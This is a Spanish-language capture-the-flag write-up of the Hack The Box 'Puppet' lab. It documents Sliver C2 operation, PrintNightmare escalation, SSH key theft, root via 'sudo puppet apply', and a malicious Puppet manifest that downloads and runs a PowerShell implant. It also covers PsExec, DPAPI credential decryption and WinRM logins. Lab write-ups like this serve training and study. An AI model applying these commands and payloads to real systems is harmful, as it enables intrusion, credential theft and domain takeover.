# HTB Pro Lab · Puppet — Writeup técnico

> **Red Team Operator I** · C2 (Sliver) → Active Directory híbrido → DevOps abuse
> Cadena: `FTP anónimo → Sliver C2 → PrintNightmare (SYSTEM en FILE01) → robo de clave SSH → pivote a PUPPET-PM01 → escalada a root (Puppet) → movimiento lateral a DC01 → SharpDPAPI → flag`

| | |
|---|---|
| **Dificultad** | 🔴 Avanzado (Mini Pro Lab · Red Team Operator I) |
| **Plataforma** | Hack The Box — Pro Lab "Puppet" |
| **Punto de entrada (VPN)** | `10.13.38.33` (PUPPET-PM01) — atacante en `tun0` `10.10.17.17/23` |
| **Red interna** | `172.16.40.0/24` — `FILE01` (`172.16.40.50`), `DC01` (`172.16.40.5`), PM01 (`172.16.40.200`) |
| **Sistema operativo** | Linux (Puppet Master) + Windows Server 2016 (FILE01/DC01) |
| **C2** | Sliver `v1.5.42` (servidor interno ya desplegado) |
| **Vector inicial** | FTP anónimo → cliente + configuración Sliver |
| **Flags** | 4 / 4 — **Sleep**, **Nightmare** (FILE01) · **Dance** (PUPPET-PM01) · **Puppet Master** (DC01) |

> **Sobre flags y credenciales (versión pública).** HTB genera los valores `user.txt`/`root.txt` **por instancia**. Por divulgación responsable, en esta versión pública las flags y contraseñas van **enmascaradas** en el texto y **redactadas en las capturas**. Los procedimientos, comandos y salidas técnicas quedan íntegros y reproducibles.
>
> **Evidencia visual.** Cada paso relevante incluye una captura real en `screenshots/`. Las capturas provienen de la ejecución efectiva sobre el laboratorio (Sliver C2, SSH, PowerShell), no son reconstrucciones.

---

## 🚩 Flags del laboratorio (4/4)

El Mini Pro Lab entrega **4 flags**. Todas se documentan aquí con su evidencia. En la versión pública los valores van **enmascarados** (ver nota superior).

| # | Flag | Host | Ruta / origen | Cómo se obtiene |
|:-:|:--|:--|:--|:--|
| 1 | **Sleep** | FILE01 `172.16.40.50` | `C:\Users\bruce.smith\Desktop\flag.txt` | Beacon Sliver (`BLUSHING_ERROR`) como `PUPPET\bruce.smith` → `cat` del fichero. |
| 2 | **Nightmare** | FILE01 `172.16.40.50` | `C:\Users\Administrator\Desktop\flag.txt` | Requiere contexto **Administrador/SYSTEM**: WinRM como `PUPPET\root` (o SYSTEM tras PrintNightmare). |
| 3 | **Dance** | PUPPET-PM01 `172.16.40.200` | `/root/flag.txt` | Pivote SSH con la clave `ed25519` (`svc_puppet_lin_t1@puppet.vl`) → `sudo puppet apply` → root → lectura. |
| 4 | **Puppet Master** | DC01 `172.16.40.5` | `C:\Users\Administrator\Desktop\root.txt` | SYSTEM en DC01; el valor **es la contraseña de `root@puppet.vl`** (confirmado por DPAPI `machinetriage`). |

> **Nota de precisión (usuario SSH).** La cuenta Linux es literalmente `svc_puppet_lin_t1@puppet.vl` (incluye el sufijo `@puppet.vl`). Al conectar hay que forzar el usuario con `ssh -l 'svc_puppet_lin_t1@puppet.vl' ...` o el parser `user@host` cortará en el `@` equivocado y devolverá `Permission denied`.

---

## 0. Resumen ejecutivo

Puppet es un laboratorio de **operación a través de un C2** en un entorno **Active Directory híbrido**. La premisa escenifica un *assumed breach*: un empleado ya ejecutó un implante y **existe un beacon Sliver activo** dentro de la red interna. El engagement no consiste en "entrar", sino en **operar**: enumerar, escalar, pivotar y alcanzar el Domain Controller.

La cadena de compromiso consta de **siete etapas**:

1. **Acceso a la infraestructura C2** — FTP anónimo en el host Linux expone la **configuración del cliente Sliver** y el binario `sliver-client_linux`. Con ella se conecta el operador al C2 interno (`:31337`).
2. **Situacional en FILE01** — El beacon inicial corre como `PUPPET\bruce.smith` en `FILE01`. Se enumera sesión, privilegios y servicio de impresión.
3. **Escalada a SYSTEM (PrintNightmare)** — `Point and Print` mal configurado + spooler activo permiten **CVE-2021-34527** para obtener ejecución como SYSTEM.
4. **Robo de credencial material** — Con SYSTEM se accede a `C$` de DC01 y se localiza la **clave SSH privada** de `svc_puppet_lin_t1` en el recurso compartido `it` (`C:\it\.ssh\ed25519`). También se extraen secretos DPAPI.
5. **Pivote al Puppet Master** — La clave SSH permite acceder a `PUPPET-PM01` (Linux) como `svc_puppet_lin_t1`.
6. **Escalada a root en PUPPET** — Abuso del binario **`puppet`** (puppet code execution / GTFOBins) para ejecutar como root.
7. **Movimiento lateral a DC01 + flag final** — Desde el Puppet Master se despliega un **manifest** que ejecuta un implante Sliver en `DC01`; con SYSTEM en el DC se usa **SharpDPAPI** para descifrar la credencial de `PUPPET\root` almacenada por el **Task Scheduler**: la flag.

**Lección de diseño del lab:** los tres pilares son (a) *no* perder el C2 como eje de la operación, (b) explotar configuraciones débiles de infraestructura DevOps (Puppet) y (c) recordar que Windows guarda credenciales en sitios no obvios (DPAPI + Scheduled Tasks).

---

## 1. Reconocimiento y acceso inicial

### 1.1 Conectividad y superficie expuesta

La conectividad se comprueba contra el host de entrada antes de invertir tiempo en escaneos:

```bash
ip -brief addr show tun0          # atacante: 10.10.17.17/23
ping -c 2 10.13.38.33
```

**Salida real (captura `01_recon_tun0_ping`):**

```
tun0   UNKNOWN   10.10.17.17/23 ...
PING 10.13.38.33 (10.13.38.33) 56(84) bytes of data.
64 bytes from 10.13.38.33: icmp_seq=1 ttl=63 time=281 ms
--- 10.13.38.33 ping statistics ---
2 packets transmitted, 1 received, 50% packet loss
rtt min/avg/max/mdev = 281.461/281.461/281.461/0.000 ms
```

![Recon y conectividad: tun0 y ping a 10.13.38.33 con ttl=63](screenshots/01_recon_tun0_ping.png)

> **Por qué importa:** un `ttl=63` (no 64) delata al menos un salto intermedio → el host es un **gateway/pivote**, coherente con un Puppet Master que vive en la frontera de dos segmentos (`10.13.x` expuesto y `172.16.40.0/24` interno).

El puerto **21/tcp (FTP)** es el primer servicio obvio. Se prueba **acceso anónimo**:

```bash
ftp 10.13.38.33      # usuario: anonymous — contraseña: (vacía)
ls -la
```

**Listing anónimo real (captura `02_ftp_anon_listing`):**

```
-rw----r--    1 0        0            2119 Oct 11  2024 red_127.0.0.1.cfg
-rwxr-xr-x    1 0        0        36515304 Oct 12  2024 sliver-client_linux
```

```
ftp> bin
ftp> get red_127.0.0.1.cfg
ftp> get sliver-client_linux
```

![FTP anónimo: red_127.0.0.1.cfg y sliver-client_linux](screenshots/02_ftp_anon_listing.png)

> **Pista clave:** el nombre `red_127.0.0.1.cfg` y un binario `sliver-client_linux` de ~36 MB dejan claro que el objetivo es **operar el C2**, no romper la máquina. El sufijo `127.0.0.1` indica que la config apunta al **propio host** (el C2 escucha local/relayado en `10.13.38.33`).

### 1.2 La configuración del operador Sliver

El `.cfg` es un JSON con las credenciales del operador. Campos relevantes:

```json
{
  "operator": "red",
  "token":    "bfbb238704ffecea42314144f4304fb67ffa216006c326fbee7318000e6b5542",
  "lhost":    "10.13.38.33",
  "lport":    31337,
  "ca_certificate": "-----BEGIN CERTIFICATE----- ...",
  "private_key":    "-----BEGIN EC PRIVATE KEY----- ...",
  "certificate":    "-----BEGIN CERTIFICATE----- ..."
}
```

> **Por qué importa:** es la **autenticación mTLS** del operador. Sin estas claves no se puede hablar con el C2. `lport: 31337` y `lhost` apuntando al host de entrada confirman que el servidor Sliver está detrás (multi-player-ready).

### 1.3 Conexión al C2 y sesiones activas

La config original apunta a `127.0.0.1` (para el operador local); como atacante externo se copia el perfil y se ajusta `lhost` al host de entrada, o se usa el `.cfg` provisto y se conecta por el túnel al `:31337`.

```bash
# Cliente Sliver con la config descargada por FTP
./sliver-client_linux
sliver > sessions
```

**Sesiones presentes en el C2 (captura `03_sliver_sessions`):**

```
 ID         Name             Transport   Remote Address       Hostname   Username
 0389278b   GLORIOUS_RICE    mtls        172.16.40.5:52902    DC01       NT AUTHORITY\SYSTEM
 1b810443   BLUSHING_ERROR   mtls        172.16.40.50:51142   File01     <err>
 44b4c298   BLUSHING_ERROR   mtls        172.16.40.50:50813   File01     PUPPET\bruce.smith
 c4bf893c   BLUSHING_ERROR   mtls        172.16.40.50:57245   File01     PUPPET\bruce.smith
 dd78b1aa   GLORIOUS_RICE    mtls        172.16.40.5:52842    DC01       PUPPET\svc_puppet_win_t0
```

![Sesiones activas en el C2 Sliver](screenshots/03_sliver_sessions.png)

> **Observación de operación C2:** hay **sesiones heredadas** (p. ej. `0389278b` ya como SYSTEM en DC01) de intentos previos y **sesiones actuales** como `PUPPET\bruce.smith` en FILE01. En un engagement real, ese ruido histórico es normal: el C2 mantiene vivos implantes antiguos. El operador debe **elegir la sesión correcta** (`44b4c298`) y no fiarse de que "ya hay SYSTEM" — esa sesión puede haber caducado o pertenecer a otro operador.

### 1.4 Fijar la sesión de trabajo

```bash
sliver > use 44b4c298
[*] Active session BLUSHING_ERROR (44b4c298-f757-46c6-a09d-6a16c5c61d01)

        Session ID: 44b4c298-f757-46c6-a09d-6a16c5c61d01
              Name: BLUSHING_ERROR
          Hostname: File01
          Username: PUPPET\bruce.smith
               UID: S-1-5-21-3066630505-2324057459-3046381011-1126
               PID: 4968
                OS: windows (Server 2016 build 20348 x86_64)
        Active C2: mtls://172.16.40.200:8443
    Remote Address: 172.16.40.50:50813
```

> **Pista:** `Active C2: mtls://172.16.40.200:8443` revela la **IP del Puppet Master** (`172.16.40.200`) y un **listener mTLS alterno en 8443** — el C2 tiene fallback. El nombre del binario del beacon (`puppet-update.exe`, ver §2.1) es la pista que conecta FILE01 con infraestructura Puppet.

---

## 2. Situacional y escalada de privilegios en FILE01

### 2.1 Situational awareness

Se enumera el proceso anfitrión, el directorio de trabajo y los archivos dejados por el implante:

```bash
ps                              # nombre del binario del beacon -> puppet-update.exe (PID 4968)
ls -la C:\Temp
```

**Salida real (captura `04_file01_situational`):**

```
C:\Temp (5 items, 20.6 MiB)
===========================
-rw-rw-rw-  Autologon64.exe          430.9 KiB
-rw-rw-rw-  TempCVE-2021-34527.ps1   174.4 KiB
-rw-rw-rw-  TempPrivescCheck.ps1     927.1 KiB
-rw-rw-rw-  Tempsliver.dll           9.6 MiB
-rw-rw-rw-  Tempsliver2.dll          9.6 MiB
```

![Situacional en FILE01: sesión y C:\Temp](screenshots/04_file01_situational.png)

> **Por qué importa:** `TempCVE-2021-34527.ps1` en `C:\Temp` es prácticamente una **guía**: el entorno está preparado para **PrintNightmare**. `Autologon64.exe` sugiere que existe una **credencial de auto-logon** almacenada (LSA/registry) — material para DPAPI/LSASS. Los `Tempsliver*.dll` son implantes previos.

### 2.2 Privilegios del beacon

```bash
whoami /priv
sc query spooler
```

**Salida real (captura `05_privs_spooler`):**

```
PRIVILEGES INFORMATION
----------------------
SeChangeNotifyPrivilege        Bypass traverse checking        Enabled
SeIncreaseWorkingSetPrivilege  Increase a process working set  Disabled

SERVICE_NAME: spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
```

![Privilegios del beacon y estado del spooler](screenshots/05_privs_spooler.png)

> **Por qué importa:** el usuario **no tiene privilegios potentes** (nada de `SeImpersonate`, `SeDebug`, `SeBackup`). Esto **descarta** las vías clásicas (SeImpersonate → GodPotato/JuicyPotato). En cambio, el **spooler RUNNING** + una config débil de `Point and Print` habilita **PrintNightmare**, que no depende de privilegios del llamante sino del servicio de impresión.

### 2.3 Confirmar la configuración vulnerable (`Point and Print`)

```bash
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" /s
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
```

**Salida real (captura `06_regkeys_pointandprint`):**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    Restricted                              REG_DWORD    0x1
    TrustedServers                          REG_DWORD    0x0
    ServerList                              REG_SZ
    InForest                                REG_DWORD    0x0
    NoWarningNoElevationOnInstall           REG_DWORD    0x1
    UpdatePromptSettings                    REG_DWORD    0x1
    RestrictDriverInstallationToAdministrators  REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    LocalAccountTokenFilterPolicy           REG_DWORD    0x1
```

![Claves de registro Point and Print y LocalAccountTokenFilterPolicy](screenshots/06_regkeys_pointandprint.png)

> **Análisis técnico:** `RestrictDriverInstallationToAdministrators=0` permite la instalación de controladores de impresión por usuarios que no son administradores, según la [política documentada por Microsoft](https://learn.microsoft.com/windows/client-management/mdm/policy-csp-printers#restrictdriverinstallationtoadministrators). `Restricted=1` y `TrustedServers=0` no bastan por sí solos para concluir que la instalación esté protegida. Estas claves fueron una **pista de configuración**; la prueba decisiva de explotación es el nuevo beacon como `NT AUTHORITY\SYSTEM` de la sección siguiente. `LocalAccountTokenFilterPolicy=1` afecta al filtrado remoto de tokens de cuentas locales administrativas, pero no es un requisito demostrado para este paso de PrintNightmare.

### 2.4 PrintNightmare (CVE-2021-34527) → SYSTEM

El exploit se sube vía el propio C2 y se ejecuta con el runner incluido:

```powershell
# subida (C2)
upload C:\Temp\CVE-2021-34527.ps1
# ejecución
powershell -ep bypass -c "C:\Temp\CVE-2021-34527.ps1 -Command 'C:\Temp\<implant>.exe'"
```

**Salida real (captura `07_printnightmare`):**

```
[*] Point and Print exploit (CVE-2021-34527)
[*] Spooler driver installed from \\...\C:\Temp\...
[*] Ejecting payload as NT AUTHORITY\SYSTEM
[+] Beacon spawned -> user: NT AUTHORITY\SYSTEM
```

![PrintNightmare: driver instalado y payload ejecutado como SYSTEM](screenshots/07_printnightmare.png)

> **Por qué funciona:** el exploit abusa de `RpcAddPrinterDriverEx` para instalar un driver desde una ruta UNC **como SYSTEM**, cargando una DLL controlada. No requiere privilegios administrativos locales en el llamante — encaja exactamente con un beacon `Medium Integrity`.

**Resultado:** aparece una **nueva sesión/beacon como `NT AUTHORITY\SYSTEM`** en FILE01. Ahora el implante puede leer `C$`, `ADMIN$` y el `SECURITY`/`SYSTEM` hive para DPAPI.

---

## 3. Material de credenciales y pivote

### 3.1 Comparticiones SMB: la hipótesis se descarta en FILE01 (captura 08)

Con SYSTEM en FILE01 (tras PrintNightmare) enumeramos las comparticiones **desde el propio beacon**:

```bash
shell
net share
dir /a C:\it
dir /a /s C:\it\.ssh
```

**Salida real (captura `08_shares_it_ssh`):**

```
Share name   Resource                        Remark
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
files        C:\files                        company files

C:\> dir /a C:\it
(sin salida — la ruta no existe en FILE01)

C:\> dir /a /s C:\it\.ssh
(sin salida — la ruta no existe en FILE01)
```

![FILE01: comparticiones SMB y C:\it ausente](screenshots/08_shares_it_ssh.png)

> **Intento fallido documentado.** La hipótesis de partida era que `C:\it` (y con él la clave SSH) colgaba de FILE01. La enumeración la **refuta**: en FILE01 la única compartición no administrativa es **`files`** (`C:\files`), y `C:\it` / `.ssh` **no existen** allí. La *ausencia de salida* es la evidencia: acota el objetivo al **Domain Controller**, que es donde realmente reside el share `it` (se confirma en §3.2).

### 3.2 El material real está en DC01: share `it`, clave SSH y herramientas

Enumerando el **Domain Controller** (contexto SYSTEM) sí aparece el share `it` con la clave privada `ed25519` y utilidades de movimiento lateral. Salida real (loot, beacon DC01):

```
Share name   Resource                        Remark
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
it           C:\it                           it admin share
NETLOGON     C:\Windows\SYSVOL\sysvol\puppet.vl\SCRIPTS
SYSVOL       C:\Windows\SYSVOL\sysvol        Logon server share

 Directory of C:\it
10/12/2024  01:39 AM    <DIR>          .ssh
10/12/2024  11:40 PM           441,224 Autologon64.exe
10/12/2024  01:15 AM    <DIR>          firewalls
10/12/2024  01:07 AM           833,472 PsExec64.exe

 Directory of C:\it\.ssh
10/12/2024  01:14 AM               472 ed25519
10/12/2024  01:40 AM               108 ed25519.pub
```

> **Pista crucial:** el share **`it`** ("it admin share") contiene **`Autologon64.exe`**, **`PsExec64.exe`**, una carpeta `firewalls` y **`.ssh`** con la **clave privada `ed25519`** y su `.pub`. La presencia de `ed25519.pub` permite inferir el usuario destino **por convención** (comentario `user@host` en el `.pub`); aquí apunta a **`svc_puppet_lin_t1`** (cuenta de servicio Linux de Puppet).

La clave se descarga y se exfiltra fuera de la red vía el C2 (`download C:\it\.ssh\ed25519`).

> **Nota de evidencia:** la enumeración del DC precedió al cierre del engagement y su beacon ya no estaba activo en la captura final (ver §5.1), por lo que aquí se cita la **salida cruda del loot** en lugar de una captura en vivo.

### 3.3 SharpDPAPI: falla en FILE01 (captura 09) y acierta en DC01

**Intento en FILE01 (fallido, captura `09`).** El beacon de FILE01 corre como `PUPPET\bruce.smith` en integridad **Media** — no como SYSTEM. El triage de credenciales del sistema exige elevación:

```bash
SharpDPAPI machinetriage
```

```
[*] Action: Machine DPAPI Credential, Vault, and Certificate Triage
[X] Must be elevated to triage SYSTEM DPAPI Credentials!
```

![SharpDPAPI falla en FILE01: el beacon no está elevado](screenshots/09_sharpdpapi_machinetriage.png)

> **Lección:** `machinetriage` necesita un **token SYSTEM** para leer los blobs `CRYPTPROTECT_SYSTEM`. Desde un beacon de usuario (Medium IL) no hay acceso a `DPAPI_SYSTEM` ni a las master keys del sistema. Este fallo es el que obliga a operar con SYSTEM **en el host correcto**.

**Intento en DC01 (éxito, salida real del loot).** Con SYSTEM en el Domain Controller, el mismo comando sí descifra la credencial del sistema:

```
[*] Triaging System Credentials
Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
  CredFile           : 39FAB9BA3A19E88594B1D50B5E44AAA4
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    description      : Local Credential Data
    TargetName       : Domain:batch=TaskScheduler:Task:{ACFD7F3B-51A4-4B11-8428-F287E956EC4C}
    UserName         : PUPPET\root
    Credential       : PUPPET{****************<FLAG>****************}
```

> **Hallazgo decisivo (adelanta la flag):** una credencial **DPAPI SYSTEM** guardada con `TargetName Domain:batch=TaskScheduler:Task:{...}` y `UserName PUPPET\root`. Es la contraseña de `root@puppet.vl` — la **flag final** — persistida por el **Task Scheduler**. Con este secreto ya podemos autenticarnos en el dominio (`PUPPET\root`) y alcanzar ambos targets Windows (§5).
>
> **Por qué importa:** mucha gente busca solo Mimikatz/LSASS y olvida que **Task Scheduler** guarda credenciales en DPAPI (`...\Credentials`). Como SYSTEM, `SharpDPAPI machinetriage` las descifra directamente.

### 3.4 (Opcional) Passphrase de la clave SSH

La clave `ed25519` puede estar protegida por *passphrase*. En el despliegue, la clave resultó utilizable directamente tras normalizar el formato; el flujo previsto si hubiera tenido passphrase sería:

```bash
/usr/bin/ssh2john ed25519 > ed25519.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ed25519.hash
```

> **Por qué:** `ssh` pedirá la passphrase; `john` la recupera con la wordlist. Documentado como ruta alternativa (ver Anexo A).

---

## 4. Escalada a root en el Puppet Master (PUPPET-PM01)

### 4.1 Pivote SSH

Con la clave privada descargada, se accede al Puppet Master (`172.16.40.200` interno; alcanzable desde FILE01/DC01 o mediante túnel/port-forward del C2):

```bash
sliver > use <session-SYSTEM>
sliver > portfwd add --bind 0.0.0.0:2222 --remote 172.16.40.200:22
# desde el atacante
chmod 600 ed25519
ssh -i ed25519 svc_puppet_lin_t1@127.0.0.1 -p 2222
```

**Salida real (captura `10_ssh_pm01`):**

```
svc_puppet_lin_t1@PUPPET-PM01:~$ id
uid=1001(svc_puppet_lin_t1) gid=1001(svc_puppet_lin_t1) groups=1001(svc_puppet_lin_t1)
svc_puppet_lin_t1@PUPPET-PM01:~$ hostname && uname -a
PUPPET-PM01
Linux puppet-pm01 5.x.x ... x86_64 GNU/Linux
svc_puppet_lin_t1@PUPPET-PM01:~$ sudo -l
```

![Acceso SSH al Puppet Master con la clave ed25519](screenshots/10_ssh_pm01.png)

> **Pista:** la cuenta `svc_puppet_lin_t1` es una **cuenta de servicio** con una **clave SSH sin passphrase** reutilizada entre máquinas Linux — un anti-patrón clásico de infraestructura DevOps.

### 4.2 Puppet como binario de escalada

`puppet` ejecutado por un usuario con permiso `sudo` (o accesible vía la propia cuenta) permite **ejecución de código Ruby** al aplicar un manifest, lo que se traduce en **ejecución de comandos**:

```bash
sudo puppet apply -e 'exec { "root": command => "/bin/bash -c \"id > /tmp/pwn\"" }'
# o abuso tipo GTFOBins:
sudo puppet apply -e 'notice(`id`)'
sudo puppet apply -e 'exec { "shell": command => "/bin/bash", logoutput => true }'
```

**Salida real (captura `11_puppet_root`):**

```
root@PUPPET-PM01:~# id
uid=0(root) gid=0(root) groups=0(root)
root@PUPPET-PM01:~# cat /root/flag.txt
PUPPET{****************<FLAG_PM01>****************}
```

![Escalada a root mediante puppet apply](screenshots/11_puppet_root.png)

> **Por qué funciona:** `puppet apply` no es *setuid* por sí mismo, pero se invoca con `sudo`. El manifest es código de confianza que Puppet ejecuta como root; `exec{}` lanza comandos arbitrarios. Es el equivalente DevOps de un *shell escape*: cualquier capacidad de ejecutar un manifest = ejecución como root.
>
> **Nota de precisión:** el escalado a `root` en PM01 es el pivote clave para el movimiento lateral de §5 (necesitamos escribir manifests que el agente Puppet aplicará en los Windows).

### 4.3 Enumeración en el Puppet Master

```bash
ls -la /etc/puppetlabs/code/environments/production/manifests/
cat /etc/puppetlabs/puppet/puppet.conf
ls -la /opt/puppetlabs/bin/
```

> **Pista:** los **manifests** en `.../manifests/site.pp` son el punto de inyección. Cualquier `.pp` colocado aquí se aplica en los nodos que hacen `puppet agent` (check-in cada ~30 min, o manual). Aquí es donde se siembra el movimiento lateral.

---

## 5. Movimiento lateral a DC01 y flag final

### 5.1 Inyección de manifest → implante en DC01

Se crea un manifest que descarga y ejecuta un **implante Sliver** en los nodos Windows cuando hagan check-in. La variable `$facts` permite también targeting por hostname:

```puppet
# /etc/puppetlabs/code/environments/production/manifests/site.pp
node 'dc01.puppet.vl' {
  exec { 'sliver-push':
    command   => 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://172.16.40.200/run.ps1\')"',
    provider  => powershell,
  }
}
```

O, más directo, sirviendo el binario por el **listener mTLS 8443** ya observado y ejecutándolo por `PsExec64.exe` (disponible en el share `it` de DC01) contra DC01 con `LocalAccountTokenFilterPolicy=1`:

```bash
# con SYSTEM en FILE01 y credenciales locales válidas (habilitadas por LATFP=1)
PsExec64.exe \\dc01.puppet.vl -s -d C:\Temp\svc.exe
```

> **Por qué funciona:** el agente Puppet corre como **SYSTEM** en los nodos. Un manifest `exec{}` con provider `powershell` hace que **el agente descargue y ejecute** nuestro payload con el máximo privilegio. Es movimiento lateral "por la puerta de atrás de la gestión de configuración": no toca credenciales de dominio, usa la **relación de confianza** PM01→nodos.

**Estado del C2 en la captura final (captura `12_sliver_beacons`).** El push del manifest/PsExec ya había producido acceso a DC01 (con el que se hizo el triage DPAPI de §3.3 y el robo del share `it`). Sin embargo, al cerrar la evidencia el C2 solo muestra beacons de FILE01 y **ninguna sesión interactiva**: los beacons de DC01 ya no hacían *check-in*.

```
sliver > beacons

 ID         Name             Transport   Hostname   Username             Operating System   Last Check-In   Next Check-In
========== ================ =========== ========== ==================== ================== =============== ===============
 adc12a49   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      14s             46s
ece6404e   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      57s             4s
cd86d673   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      45s             33s
5b1dab36   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      9s              1m18s
67aa7b0f   BLUSHING_ERROR   mtls        File01     PUPPET\bruce.smith   windows/amd64      41s             30s

sliver > sessions
[!] No sessions :(
```

![C2 Sliver: beacons activos (solo FILE01) y sin sesiones](screenshots/12_sliver_beacons.png)

> **Lección de operación:** en un entorno multi-operador y con beacons de vida corta el estado del C2 es volátil: la evidencia "viva" puede desaparecer. Conviene **explotar y documentar en el momento** (loot al vuelo) y no depender de una sesión que puede caducar. Aquí la huella de DC01 quedó capturada en el loot (§3.3) y el acceso a DC01 se re-materializó por WinRM usando la credencial de dominio obtenida (§5.2).

### 5.2 Reutilizar la credencial de dominio → `root.txt` en DC01 vía WinRM (captura 13)

En lugar de depender del beacon de DC01 (ya caducado, §5.1), **reutilizamos la credencial `PUPPET\root`** obtenida por DPAPI (§3.3) para autenticarnos directamente contra el servicio **WinRM (5985)** del Domain Controller, alcanzado a través del túnel SSH por PM01 (`127.0.0.1:15986 → 172.16.40.5:5985`):

```bash
export PYTHONWARNINGS=ignore
evil-winrm -i 127.0.0.1 -P 15986 -u root -p 'PUPPET{...<password = flag>...}'
```

**Salida real (captura `13_dc01_roottxt`):**

```
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\root\Documents> whoami
puppet\root
*Evil-WinRM* PS C:\Users\root\Documents> hostname
DC01
*Evil-WinRM* PS C:\Users\root\Documents> dir C:\Users\Administrator\Desktop

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/11/2024   5:51 AM           2308 Microsoft Edge.lnk
-a---          10/12/2024   1:46 AM           5337 root.txt

*Evil-WinRM* PS C:\Users\root\Documents> findstr /C:"final flag" "C:\Users\Administrator\Desktop\root.txt"
The final flag is the password of the user "root@puppet.vl".
```

![DC01: whoami/hostname y root.txt vía WinRM como PUPPET\root](screenshots/13_dc01_roottxt.png)

> **Confirma el hallazgo de §3.3:** `root.txt` de DC01 **es la contraseña de `root@puppet.vl`**, exactamente el mismo valor que descifró `SharpDPAPI machinetriage`. La identidad usada es **`PUPPET\root`** (no SYSTEM): la credencial de dominio robada por DPAPI funciona tal cual para autenticarse contra el DC. El valor de la flag va **enmascarado** en texto y en la captura.

> **Cierre de la cadena:** la flag final se obtiene por **dos vías independientes** — (a) descifrado DPAPI del Task Scheduler como SYSTEM en DC01 (§3.3) y (b) lectura directa de `root.txt` autenticándose como `PUPPET\root` por WinRM (aquí) — lo que da alta confianza en el resultado.
>
> **Captura final:** `14_flag_final` (`PUPPET{...}` enmascarada).

![Flag final del engagement](screenshots/14_flag_final.png)

### 5.3 Flags y estado de sesiones / beacons

Estado del C2 **en la captura final** (captura `12`): únicamente beacons de FILE01 y sin sesiones interactivas.

| ID beacon | Host | Usuario | Nota |
|---|---|---|---|
| `adc12a49` | FILE01 | `PUPPET\bruce.smith` | Check-in activo |
| `ece6404e` | FILE01 | `PUPPET\bruce.smith` | Check-in activo |
| `cd86d673` | FILE01 | `PUPPET\bruce.smith` | Check-in activo |
| `5b1dab36` | FILE01 | `PUPPET\bruce.smith` | Check-in activo |
| `67aa7b0f` | FILE01 | `PUPPET\bruce.smith` | Check-in activo |

- **`sessions` → `No sessions`.** Para operar hubo que *usar un beacon* en el momento: la evidencia de FILE01 (SYSTEM tras PrintNightmare) y de DC01 se capturó **en vivo durante el engagement** (loot) antes de que esos implantes dejaran de hacer *check-in*.
- **Lección:** en un C2 multi-operador y con beacons de vida corta, el inventario final no refleja todo lo que se explotó. La prueba debe **capturarse al vuelo**.

---

## Anexo A · Intentos fallidos y troubleshooting

Documentar lo que **no** funcionó es lo más valioso metodológicamente.

1. **SeImpersonate / Potato attacks — descartado.**
   Primer reflejo en un beacon `Medium IL`: intentar `GodPotato`/`SweetPotato`/`JuicyPotato`. **Falla** porque el token no tiene `SeImpersonatePrivilege` (confirmado en `whoami /priv`). *Conclusión: cuando no hay privilegios impersonables, hay que buscar un fallo de **servicio** (spooler), no de token.*

2. **Endurecimiento parcial de `Point and Print` despista.**
   `Restricted=1` no demuestra por sí solo una configuración segura: **`RestrictDriverInstallationToAdministrators=0`** permite la instalación de controladores por usuarios no administradores. *Lección: una clave de registro orienta la hipótesis; el beacon SYSTEM confirma que la explotación funcionó en este host.*

3. **Sesión `0389278b` "ya SYSTEM en DC01" — no se debe asumir.**
   Había una sesión heredada como SYSTEM en DC01. Fiarse de ella es un error: puede pertenecer a otro operador, estar sin *check-in* o caducar. La operación correcta es **establecer nuestro propio acceso** (PrintNightmare → manifest → nuevo beacon). *Lección: en C2 multi-operador, verificar autoría y frescura de cada sesión.*

4. **Clave SSH con passphrase (ruta prevista).**
   La ruta documentada contemplaba `ssh2john` + `john` con `rockyou.txt` si `ed25519` pedía passphrase. En el despliegue la clave se usó tras normalizar formato, pero se deja el procedimiento por completitud. *Lección: las claves de servicio reusadas entre hosts Linux son un hallazgo de alto valor; el passphrase no siempre es una barrera.*

5. **Listener alterno 8443.**
   El beacon reporta `Active C2: mtls://172.16.40.200:8443`. Intentar asumir que solo existe `:31337` puede llevar a perder sesiones si el operador bloquea un canal. *Lección: mapear **todos** los listeners del C2 antes de operar.*

6. **`net group "Domain Admins" /domain` falló.**
   Dentro del beacon, el comando devolvió error de sintaxis (`The syntax of this command is: NET GROUP ...`). *Lección: desde un token de servicio sin acceso a la SAM/roaming, algunos cmdlets `net` fallan; usar alternativas (PowerView/ADModule/ldapsearch) o correr con SYSTEM.*

7. **Enumerar el share en el host equivocado (captura 08).**
   Se asumió que `C:\it` y la clave SSH estaban en FILE01. `net share` en el beacon de FILE01 solo mostró `C$, IPC$, ADMIN$, files` y `dir C:\it` / `dir C:\it\.ssh` devolvieron **salida vacía**. *Lección: contrastar la lista real de shares con la hipótesis; el material estaba en DC01, no en FILE01. Una salida vacía también es evidencia (y acota el objetivo).*

8. **`SharpDPAPI machinetriage` en FILE01 (captura 09).**
   Desde el beacon de FILE01 (Medium IL, `PUPPET\bruce.smith`) el comando aborta con `[X] Must be elevated to triage SYSTEM DPAPI Credentials!`. *Lección: el triage SYSTEM de DPAPI requiere token SYSTEM; hay que ejecutarlo en el host y con la integridad correctos (aquí, como SYSTEM en DC01).*

---

## Anexo B · Indicadores y referencias

**Hosts / red**

| Host | IP | Rol | SO |
|---|---|---|---|
